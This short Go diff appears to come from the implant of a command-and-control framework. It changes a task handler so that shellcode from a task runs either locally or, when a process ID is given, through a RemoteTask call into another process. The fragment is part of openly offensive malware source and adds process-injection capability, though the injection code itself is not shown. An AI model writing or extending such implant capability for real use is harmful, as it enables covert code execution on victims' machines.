@@ -346,8 +346,9 @@ func dumpHandler(data []byte, resp RPCResponse) {
 }
 
 func taskHandler(data []byte, resp RPCResponse) {
+	var err error
 	task := &pb.Task{}
-	err := proto.Unmarshal(data, task)
+	err = proto.Unmarshal(data, task)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
@@ -355,7 +356,11 @@ func taskHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
 	resp([]byte{}, err)
 }
 
